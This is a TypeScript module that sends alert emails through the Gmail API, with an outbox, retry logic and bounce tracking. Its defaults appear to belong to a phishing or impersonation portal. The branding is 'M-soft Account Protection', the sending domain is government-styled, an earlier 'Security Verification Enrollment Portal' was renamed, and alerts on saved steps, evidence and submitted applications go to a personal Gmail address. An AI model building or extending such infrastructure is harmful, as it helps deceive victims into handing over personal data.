import { and, eq, inArray, isNull, lt, or } from "drizzle-orm";
import { createHash } from "node:crypto";
import { ReplitConnectors } from "@replit/connectors-sdk";
import {
  db,
  staffEmailOutboxTable,
  staffEmailProviderEventsTable,
  staffEmailSettingsTable,
  type StaffEmailBranding,
  type StaffEmailAlertEvents,
  type StaffEmailOutboxRecord,
} from "@workspace/db";
import { renderStaffEmailHtml, renderStaffEmailText } from "./staffEmailTemplate";

export type StaffEmailEventKind = keyof StaffEmailAlertEvents;
export type StaffEmailMessageKind = StaffEmailEventKind | "manual";

export const STAFF_EMAIL_ADDRESS = "notifications@vu-gov.cc";
export const STAFF_EMAIL_DOMAIN = STAFF_EMAIL_ADDRESS.split("@")[1]!;

export function isApprovedStaffSenderAddress(email: string): boolean {
  const normalizedEmail = email.trim().toLowerCase();
  const match = normalizedEmail.match(/^[^@\s]+@([^@\s]+)$/);
  return match?.[1] === STAFF_EMAIL_DOMAIN;
}

type GmailApiOptions = {
  method: "GET" | "POST";
  headers?: Record<string, string>;
  body?: string;
};

type GmailProfile = {
  emailAddress?: unknown;
};

type GmailMessageList = {
  messages?: Array<{ id?: unknown }>;
};

type GmailMessagePayload = {
  mimeType?: unknown;
  headers?: Array<{ name?: unknown; value?: unknown }>;
  body?: { data?: unknown };
  parts?: GmailMessagePayload[];
};

type GmailFullMessage = {
  internalDate?: unknown;
  payload?: GmailMessagePayload;
};

const GMAIL_PROFILE_CACHE_MS = 5 * 60 * 1000;
const GMAIL_DELIVERY_SYNC_CACHE_MS = 60 * 1000;
let cachedWorkspaceMailbox: { emailAddress: string; expiresAt: number } | null = null;
let workspaceMailboxLookup: Promise<string> | null = null;
let lastWorkspaceDeliverySyncAt = 0;
let workspaceDeliverySync: Promise<void> | null = null;
const inspectedWorkspaceDeliveryMessageIds = new Set<string>();

async function gmailRequest(path: string, options: GmailApiOptions): Promise<Response> {
  return new ReplitConnectors().proxy("google-mail", path, options);
}

export async function getWorkspaceMailboxAddress(): Promise<string> {
  if (cachedWorkspaceMailbox && cachedWorkspaceMailbox.expiresAt > Date.now()) {
    return cachedWorkspaceMailbox.emailAddress;
  }
  if (workspaceMailboxLookup) return workspaceMailboxLookup;

  workspaceMailboxLookup = (async () => {
    const response = await gmailRequest("/gmail/v1/users/me/profile", { method: "GET" });
    if (!response.ok) {
      throw new Error(`Google Workspace mailbox lookup failed (${response.status}).`);
    }
    const profile = await response.json() as GmailProfile;
    const emailAddress = typeof profile.emailAddress === "string"
      ? profile.emailAddress.trim().toLowerCase()
      : "";
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(emailAddress)) {
      throw new Error("Google Workspace did not return a valid sender address.");
    }
    cachedWorkspaceMailbox = {
      emailAddress,
      expiresAt: Date.now() + GMAIL_PROFILE_CACHE_MS,
    };
    return emailAddress;
  })();

  try {
    return await workspaceMailboxLookup;
  } finally {
    workspaceMailboxLookup = null;
  }
}

function encodeMimeHeader(value: string): string {
  const safeValue = value.replace(/[\r\n]+/g, " ").trim();
  return `=?UTF-8?B?${Buffer.from(safeValue, "utf8").toString("base64")}?=`;
}

function encodeMimeBody(value: string): string {
  const base64 = Buffer.from(value, "utf8").toString("base64");
  return base64.match(/.{1,76}/g)?.join("\r\n") ?? "";
}

function gmailMessageId(idempotencyKey: string): string {
  return `${createHash("sha256").update(idempotencyKey).digest("hex")}@${STAFF_EMAIL_DOMAIN}`;
}

function decodeGmailBody(data: unknown): string {
  if (typeof data !== "string") return "";
  try {
    return Buffer.from(data, "base64url").toString("utf8");
  } catch {
    return "";
  }
}

function collectGmailMessageContent(
  payload: GmailMessagePayload | undefined,
  contentTypes: string[],
  headers: string[],
  bodies: string[],
): void {
  if (!payload) return;
  if (typeof payload.mimeType === "string") {
    contentTypes.push(payload.mimeType.toLowerCase());
  }
  for (const header of payload.headers ?? []) {
    if (typeof header.name === "string" && typeof header.value === "string") {
      headers.push(`${header.name}: ${header.value}`);
    }
  }
  const body = decodeGmailBody(payload.body?.data);
  if (body) bodies.push(body);
  for (const part of payload.parts ?? []) {
    collectGmailMessageContent(part, contentTypes, headers, bodies);
  }
}

function resolveGmailDeliveryStatus(
  contentTypes: string[],
  bodies: string[],
): "delivered" | "bounced" | null {
  if (!contentTypes.some((type) => type.includes("message/delivery-status"))) {
    return null;
  }
  const deliveryStatusParts = bodies.join("\n");
  const action = deliveryStatusParts.match(/(?:^|\r?\n)\s*Action\s*:\s*([a-z]+)/i)?.[1]
    ?.toLowerCase();
  if (action === "delivered") return "delivered";
  if (action === "failed") return "bounced";
  return null;
}

export async function recordStaffEmailDeliveryEvent(input: {
  outboxId: string;
  providerEventId: string;
  deliveryStatus: Exclude<StaffEmailDeliveryStatus, "accepted">;
  providerEventAt: Date;
}): Promise<void> {
  const earlierStatuses: Record<
    Exclude<StaffEmailDeliveryStatus, "accepted">,
    StaffEmailDeliveryStatus[]
  > = {
    delivered: ["accepted"],
    bounced: ["accepted", "delivered"],
    complained: ["accepted", "delivered", "bounced"],
  };
  await db.transaction(async (tx) => {
    const [savedEvent] = await tx
      .insert(staffEmailProviderEventsTable)
      .values(input)
      .onConflictDoNothing({
        target: staffEmailProviderEventsTable.providerEventId,
      })
      .returning({ id: staffEmailProviderEventsTable.id });

    if (!savedEvent) return;

    await tx
      .update(staffEmailOutboxTable)
      .set({
        deliveryStatus: input.deliveryStatus,
        providerEventAt: input.providerEventAt,
        updatedAt: new Date(),
      })
      .where(
        and(
          eq(staffEmailOutboxTable.id, input.outboxId),
          or(
            isNull(staffEmailOutboxTable.providerEventAt),
            lt(staffEmailOutboxTable.providerEventAt, input.providerEventAt),
          ),
          or(
            isNull(staffEmailOutboxTable.deliveryStatus),
            inArray(
              staffEmailOutboxTable.deliveryStatus,
              earlierStatuses[input.deliveryStatus],
            ),
          ),
        ),
      );
  });
}

function rememberInspectedDeliveryMessage(messageId: string): void {
  inspectedWorkspaceDeliveryMessageIds.add(messageId);
  if (inspectedWorkspaceDeliveryMessageIds.size > 5_000) {
    const oldest = inspectedWorkspaceDeliveryMessageIds.values().next().value;
    if (oldest) inspectedWorkspaceDeliveryMessageIds.delete(oldest);
  }
}

async function scanWorkspaceDeliveryNotices(
  records: StaffEmailOutboxRecord[],
): Promise<void> {
  const pendingRecords = records.filter((record) =>
    record.status === "sent" &&
    (record.deliveryStatus === "accepted" || record.deliveryStatus == null),
  );
  if (!pendingRecords.length) return;

  const byRfcMessageId = new Map(
    pendingRecords.map((record) => [
      gmailMessageId(record.idempotencyKey),
      record,
    ]),
  );
  const query = new URLSearchParams({
    q: "newer_than:90d {from:mailer-daemon from:postmaster}",
    maxResults: "50",
  });
  const listResponse = await gmailRequest(
    `/gmail/v1/users/me/messages?${query.toString()}`,
    { method: "GET" },
  );
  if (!listResponse.ok) {
    throw new Error(`Gmail delivery notice lookup failed (${listResponse.status}).`);
  }
  const listed = await listResponse.json() as GmailMessageList;
  const messageIds = (listed.messages ?? [])
    .map((message) => message.id)
    .filter((id): id is string => typeof id === "string" && id.length > 0);
  if (!messageIds.length) return;

  const eventIds = messageIds.map((id) => `gmail-dsn:${id}`);
  const knownEvents = await db
    .select({ providerEventId: staffEmailProviderEventsTable.providerEventId })
    .from(staffEmailProviderEventsTable)
    .where(inArray(staffEmailProviderEventsTable.providerEventId, eventIds));
  const knownEventIds = new Set(knownEvents.map((event) => event.providerEventId));

  for (const messageId of messageIds) {
    const providerEventId = `gmail-dsn:${messageId}`;
    if (
      knownEventIds.has(providerEventId) ||
      inspectedWorkspaceDeliveryMessageIds.has(messageId)
    ) {
      continue;
    }
    const response = await gmailRequest(
      `/gmail/v1/users/me/messages/${encodeURIComponent(messageId)}?format=full`,
      { method: "GET" },
    );
    if (!response.ok) {
      if (response.status === 404) {
        rememberInspectedDeliveryMessage(messageId);
        continue;
      }
      throw new Error(`Gmail delivery notice could not be loaded (${response.status}).`);
    }
    const message = await response.json() as GmailFullMessage;
    const contentTypes: string[] = [];
    const headers: string[] = [];
    const bodies: string[] = [];
    collectGmailMessageContent(message.payload, contentTypes, headers, bodies);
    const deliveryStatus = resolveGmailDeliveryStatus(contentTypes, bodies);
    const searchableContent = `${headers.join("\n")}\n${bodies.join("\n")}`.toLowerCase();
    const matched = [...byRfcMessageId.entries()].find(([rfcMessageId]) =>
      searchableContent.includes(rfcMessageId.toLowerCase()),
    );
    const internalDate = typeof message.internalDate === "string"
      ? Number(message.internalDate)
      : typeof message.internalDate === "number"
        ? message.internalDate
        : NaN;
    if (deliveryStatus && matched && Number.isFinite(internalDate) && internalDate > 0) {
      await recordStaffEmailDeliveryEvent({
        outboxId: matched[1].id,
        providerEventId,
        deliveryStatus,
        providerEventAt: new Date(internalDate),
      });
    }
    rememberInspectedDeliveryMessage(messageId);
  }
}

export async function refreshWorkspaceEmailDeliveryStatuses(
  records: StaffEmailOutboxRecord[],
): Promise<void> {
  if (
    Date.now() - lastWorkspaceDeliverySyncAt < GMAIL_DELIVERY_SYNC_CACHE_MS
  ) {
    return;
  }
  if (workspaceDeliverySync) return workspaceDeliverySync;

  workspaceDeliverySync = scanWorkspaceDeliveryNotices(records);
  try {
    await workspaceDeliverySync;
    lastWorkspaceDeliverySyncAt = Date.now();
  } finally {
    workspaceDeliverySync = null;
  }
}

export function resetWorkspaceEmailDeliverySyncCache(): void {
  lastWorkspaceDeliverySyncAt = 0;
  workspaceDeliverySync = null;
  inspectedWorkspaceDeliveryMessageIds.clear();
}

function buildGmailRawMessage(input: {
  idempotencyKey: string;
  senderName: string;
  senderEmail: string;
  recipientEmail: string;
  subject: string;
  text: string;
  html: string;
}): { raw: string; messageId: string } {
  const messageId = gmailMessageId(input.idempotencyKey);
  const boundary = `portal_${messageId.split("@")[0]}`;
  const mimeMessage = [
    `From: ${encodeMimeHeader(input.senderName)} <${input.senderEmail}>`,
    `To: ${input.recipientEmail}`,
    `Subject: ${encodeMimeHeader(input.subject)}`,
    `Message-ID: <${messageId}>`,
    "MIME-Version: 1.0",
    `Content-Type: multipart/alternative; boundary="${boundary}"`,
    "",
    `--${boundary}`,
    "Content-Type: text/plain; charset=UTF-8",
    "Content-Transfer-Encoding: base64",
    "",
    encodeMimeBody(input.text),
    `--${boundary}`,
    "Content-Type: text/html; charset=UTF-8",
    "Content-Transfer-Encoding: base64",
    "",
    encodeMimeBody(input.html),
    `--${boundary}--`,
    "",
  ].join("\r\n");

  return {
    raw: Buffer.from(mimeMessage, "utf8").toString("base64url"),
    messageId,
  };
}

async function findPreviouslySentGmailMessage(messageId: string): Promise<string | null> {
  const query = new URLSearchParams({
    q: `in:sent rfc822msgid:${messageId}`,
    maxResults: "1",
  });
  const response = await gmailRequest(
    `/gmail/v1/users/me/messages?${query.toString()}`,
    { method: "GET" },
  );
  if (!response.ok) {
    throw new Error(`Could not verify Gmail send status (${response.status}).`);
  }
  const result = await response.json() as GmailMessageList;
  const sentId = result.messages?.[0]?.id;
  return typeof sentId === "string" ? sentId : null;
}

async function sendGmailEmail(raw: string): Promise<Response> {
  return gmailRequest("/gmail/v1/users/me/messages/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ raw }),
  });
}

const DEFAULT_RECIPIENTS = ["skyfashion053@gmail.com"];
const STAFF_EMAIL_BRAND = "M-soft Account Protection";
export const DEFAULT_STAFF_EMAIL_BRANDING: StaffEmailBranding = {
  logoUrl: null,
  logoObjectPath: null,
  accentColor: "#49b8aa",
  headerColor: "#102b46",
  senderName: STAFF_EMAIL_BRAND,
  senderEmail: "infomail@vu-gov.cc",
  bannerMark: "MS",
  bannerTitle: STAFF_EMAIL_BRAND,
  bannerSubtitle: "Bank Grade Security System",
  preheaderText: `A message from ${STAFF_EMAIL_BRAND}.`,
  messageEyebrow: "STAFF MESSAGE",
  footerText: `${STAFF_EMAIL_BRAND} staff communications`,
  footerLinkText: `Visit ${STAFF_EMAIL_BRAND}`,
  footerLinkUrl: null,
  footerLinkColor: "#287d8b",
  footerBackgroundColor: "#f1f5f8",
  footerTextColor: "#738392",
  footerBackgroundUrl: null,
  footerBackgroundObjectPath: null,
};
const DEFAULT_ALERTS: StaffEmailAlertEvents = {
  contact_received: true,
  step_saved: true,
  contact_updated: true,
  evidence_saved: true,
  application_submitted: true,
};
const STAFF_SETTINGS_KEY = "global";
const STALE_SEND_AFTER_MS = 5 * 60 * 1000;

export type StaffEmailConfiguration = {
  recipients: string[];
  alerts: StaffEmailAlertEvents;
  branding: StaffEmailBranding;
  senderAddress: string;
  updatedAt: string | null;
};

export async function getStaffEmailConfiguration(): Promise<StaffEmailConfiguration> {
  const [saved] = await db
    .select()
    .from(staffEmailSettingsTable)
    .where(eq(staffEmailSettingsTable.key, STAFF_SETTINGS_KEY))
    .limit(1);
  const branding = { ...DEFAULT_STAFF_EMAIL_BRANDING, ...(saved?.branding ?? {}) };
  if (branding.senderName === "Security Verification") {
    branding.senderName = STAFF_EMAIL_BRAND;
  }
  if (branding.bannerMark === "SV") {
    branding.bannerMark = "MS";
  }
  if (branding.bannerTitle === "Security Verification") {
    branding.bannerTitle = STAFF_EMAIL_BRAND;
  }
  if (branding.bannerSubtitle === "ENROLLMENT PORTAL") {
    branding.bannerSubtitle = DEFAULT_STAFF_EMAIL_BRANDING.bannerSubtitle;
  }
  if (branding.preheaderText === "A message from the Security Verification Enrollment Portal team.") {
    branding.preheaderText = DEFAULT_STAFF_EMAIL_BRANDING.preheaderText;
  }
  if (branding.footerText === "Enrollment Portal staff communications") {
    branding.footerText = DEFAULT_STAFF_EMAIL_BRANDING.footerText;
  }
  if (branding.footerLinkText === "Visit the enrollment portal") {
    branding.footerLinkText = DEFAULT_STAFF_EMAIL_BRANDING.footerLinkText;
  }
  const senderAddress = await getWorkspaceMailboxAddress();
  branding.senderEmail = senderAddress;
  return {
    recipients: saved?.recipients ?? DEFAULT_RECIPIENTS,
    alerts: { ...DEFAULT_ALERTS, ...(saved?.alerts ?? {}) },
    branding,
    senderAddress,
    updatedAt: saved?.updatedAt?.toISOString() ?? null,
  };
}

export async function saveStaffEmailConfiguration(
  recipients: string[],
  alerts: StaffEmailAlertEvents,
  branding: StaffEmailBranding,
  updatedByUserId: string,
): Promise<StaffEmailConfiguration> {
  await db
    .insert(staffEmailSettingsTable)
    .values({
      key: STAFF_SETTINGS_KEY,
      recipients,
      alerts,
      branding,
      updatedByUserId,
      updatedAt: new Date(),
    })
    .onConflictDoUpdate({
      target: staffEmailSettingsTable.key,
      set: { recipients, alerts, branding, updatedByUserId, updatedAt: new Date() },
    });
  return getStaffEmailConfiguration();
}

export async function saveStaffEmailBranding(
  branding: StaffEmailBranding,
  updatedByUserId: string,
): Promise<StaffEmailConfiguration> {
  const now = new Date();
  await db
    .insert(staffEmailSettingsTable)
    .values({
      key: STAFF_SETTINGS_KEY,
      recipients: DEFAULT_RECIPIENTS,
      alerts: DEFAULT_ALERTS,
      branding,
      updatedByUserId,
      updatedAt: now,
    })
    .onConflictDoUpdate({
      target: staffEmailSettingsTable.key,
      set: { branding, updatedByUserId, updatedAt: now },
    });
  return getStaffEmailConfiguration();
}

export function emailRecipientIdempotencyKey(
  baseKey: string,
  recipientEmail: string,
): string {
  const recipientHash = createHash("sha256")
    .update(recipientEmail.trim().toLowerCase())
    .digest("hex")
    .slice(0, 32);
  return `${baseKey}:${recipientHash}`;
}

function providerFailureMessage(status: number): string {
  if (status === 401 || status === 403) {
    return "Google Workspace rejected the connected mailbox or its email-sending permission.";
  }
  if (status === 429) {
    return "The Google Workspace sending limit was reached. Retry this message later.";
  }
  if (status === 400 || status === 422) {
    return "Google Workspace rejected the message. Check the sender and message details.";
  }
  return "Google Workspace is temporarily unavailable. Retry this message later.";
}

export async function dispatchStaffEmail(input: {
  idempotencyKey: string;
  recipientEmail: string;
  subject: string;
  messageText: string;
  eventKind: StaffEmailMessageKind;
  applicationReference?: string | null;
  createdByUserId?: string | null;
}): Promise<StaffEmailOutboxRecord> {
  const recipientEmail = input.recipientEmail.trim().toLowerCase();
  const idempotencyKey = input.idempotencyKey.slice(0, 256);
  const emailConfiguration = await getStaffEmailConfiguration();
  const [inserted] = await db
    .insert(staffEmailOutboxTable)
    .values({
      idempotencyKey,
      recipientEmail,
      subject: input.subject,
      messageText: input.messageText,
      eventKind: input.eventKind,
      applicationReference: input.applicationReference ?? null,
      createdByUserId: input.createdByUserId ?? null,
      status: "sending",
      attemptCount: 1,
      updatedAt: new Date(),
    })
    .onConflictDoNothing()
    .returning();

  let record = inserted;
  let shouldCheckSentBeforeRetry = false;
  if (!record) {
    const [existing] = await db
      .select()
      .from(staffEmailOutboxTable)
      .where(eq(staffEmailOutboxTable.idempotencyKey, idempotencyKey))
      .limit(1);
    if (!existing) throw new Error("Email attempt could not be recorded.");
    if (existing.status === "sent") return existing;

    const now = new Date();
    const staleBefore = new Date(now.getTime() - STALE_SEND_AFTER_MS);
    const canClaim = existing.status === "failed"
      ? and(
          eq(staffEmailOutboxTable.id, existing.id),
          eq(staffEmailOutboxTable.status, "failed"),
        )
      : existing.status === "sending"
        ? and(
            eq(staffEmailOutboxTable.id, existing.id),
            eq(staffEmailOutboxTable.status, "sending"),
            lt(staffEmailOutboxTable.updatedAt, staleBefore),
          )
        : undefined;
    if (!canClaim) return existing;

    const [claimed] = await db
      .update(staffEmailOutboxTable)
      .set({
        status: "sending",
        errorMessage: null,
        attemptCount: existing.attemptCount + 1,
        updatedAt: now,
      })
      .where(canClaim)
      .returning();
    if (!claimed) {
      const [current] = await db
        .select()
        .from(staffEmailOutboxTable)
        .where(eq(staffEmailOutboxTable.id, existing.id))
        .limit(1);
      if (!current) throw new Error("Email attempt could not be loaded.");
      return current;
    }
    record = claimed;
    shouldCheckSentBeforeRetry = true;
  }

  if (!isApprovedStaffSenderAddress(emailConfiguration.senderAddress)) {
    const [failed] = await db
      .update(staffEmailOutboxTable)
      .set({
        status: "failed",
        errorMessage: `Sender address must use the authenticated @${STAFF_EMAIL_DOMAIN} domain.`,
        updatedAt: new Date(),
      })
      .where(eq(staffEmailOutboxTable.id, record.id))
      .returning();
    return failed ?? record;
  }

  const { raw, messageId } = buildGmailRawMessage({
    idempotencyKey,
    senderName: emailConfiguration.branding.senderName,
    senderEmail: emailConfiguration.senderAddress,
    recipientEmail,
    subject: input.subject,
    text: renderStaffEmailText({
      messageText: input.messageText,
      branding: emailConfiguration.branding,
    }),
    html: renderStaffEmailHtml({
      subject: input.subject,
      messageText: input.messageText,
      branding: emailConfiguration.branding,
    }),
  });

  if (shouldCheckSentBeforeRetry) {
    try {
      const alreadySentId = await findPreviouslySentGmailMessage(messageId);
      if (alreadySentId) {
        const [sent] = await db
          .update(staffEmailOutboxTable)
          .set({
            status: "sent",
            providerMessageId: alreadySentId,
            deliveryStatus: "accepted",
            errorMessage: null,
            updatedAt: new Date(),
          })
          .where(eq(staffEmailOutboxTable.id, record.id))
          .returning();
        return sent ?? record;
      }
    } catch {
      const [failed] = await db
        .update(staffEmailOutboxTable)
        .set({
          status: "failed",
          errorMessage: "Could not verify whether Gmail already sent this message. Check the Workspace Sent folder before retrying.",
          updatedAt: new Date(),
        })
        .where(eq(staffEmailOutboxTable.id, record.id))
        .returning();
      return failed ?? record;
    }
  }

  let lastError: string;
  let providerMessageId: string | null = null;
  try {
    const response = await sendGmailEmail(raw);
    if (response.ok) {
      try {
        const responseBody = await response.json() as { id?: unknown };
        providerMessageId = typeof responseBody?.id === "string"
          ? responseBody.id
          : null;
      } catch {
        // Gmail may accept the message even if the connector omits its response body.
      }
      const [sent] = await db
        .update(staffEmailOutboxTable)
        .set({
          status: "sent",
          providerMessageId,
          deliveryStatus: "accepted",
          errorMessage: null,
          attemptCount: record.attemptCount,
          updatedAt: new Date(),
        })
        .where(eq(staffEmailOutboxTable.id, record.id))
        .returning();
      return sent ?? record;
    }
    lastError = providerFailureMessage(response.status);
  } catch {
    lastError = "Gmail's send result could not be confirmed. Check the Workspace Sent folder before retrying.";
  }

  const [failed] = await db
    .update(staffEmailOutboxTable)
    .set({
      status: "failed",
      errorMessage: lastError,
      attemptCount: record.attemptCount,
      updatedAt: new Date(),
    })
    .where(eq(staffEmailOutboxTable.id, record.id))
    .returning();
  return failed ?? record;
}

export type StaffEmailDeliveryStatus =
  | "accepted"
  | "delivered"
  | "bounced"
  | "complained";
